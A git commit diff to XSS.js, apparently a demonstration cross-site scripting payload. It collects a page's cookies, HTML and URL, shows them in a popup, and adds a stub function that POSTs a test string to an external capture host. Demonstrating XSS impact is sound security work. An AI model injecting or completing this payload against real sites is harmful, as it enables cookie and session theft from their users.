68102e18421c7956454ab39771325b5c7a1e28ea
JDL-84 <James.lynes@googlemail.com>
2020-08-28 23:47:43 +0100

    Update XSS.js

--- XSS.js
+++ XSS.js
@@ -15,9 +15,19 @@ var UsersCookie = document.cookie;
 var DocHTML = document.getElementsByTagName('html')[0].innerHTML;
 var DocLocation = document.location.href;
 
+var Toilet = "http://ptsv2.com/t/qo33d-1598654477";
 
-var TextAreaStyle = "width:100%;height:150px;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
+function ExfiltrateData()
+{	
+	 const xhr = new XMLHttpRequest();
+	 xhr.open("POST", Toilet+"/post", true);
+	 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	 //Don't worry people,  we'll display the data but not actually post it off network
+	 xhr.send("XSS-TEST");	
+}
+
 function createPopup(){
+var TextAreaStyle = "margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
 var popup = open("", "", "width=800,height=600,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0");
 popup.document.body.style.background = "rgb(53, 53, 53)";
 //Cookie Doc Header
@@ -29,7 +39,7 @@ popup.document.title = "XSS Data";
 //Cookie Doc
 var txtCookie = popup.document.createElement("TEXTAREA");
 txtCookie.innerHTML = UsersCookie;
-txtCookie.style = TextAreaStyle
+txtCookie.style = "width:100%;height:150px;"+TextAreaStyle;
 popup.document.body.appendChild(txtCookie);
 
 //Doc Header
@@ -40,7 +50,7 @@ popup.document.body.appendChild(hDocumentInner);
 //Cookie Doc
 var txtDocumentInner = popup.document.createElement("TEXTAREA");
 txtDocumentInner.innerHTML = DocHTML;
-txtDocumentInner.style = TextAreaStyle
+txtDocumentInner.style = "width:100%;height:150px;"+TextAreaStyle;
 popup.document.body.appendChild(txtDocumentInner);
 
 //URL Header
@@ -51,8 +61,15 @@ popup.document.body.appendChild(hURLInner);
 //URL Doc
 var txtURLInner = popup.document.createElement("TEXTAREA");
 txtURLInner.innerHTML = DocLocation;
-txtURLInner.style = "width:100%;height:20px;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
+txtURLInner.style = "width:100%;height:20px;"+TextAreaStyle;
 popup.document.body.appendChild(txtURLInner);
+
+//ExfiltrateData
+var aExData = popup.document.createElement("a");
+aExData.style = "color:fff;";
+aExData.innerHTML = "Was this data exfiltrated to external source?";
+aExData.href = Toilet;
+popup.document.body.appendChild(aExData);
 
 }
 createPopup();
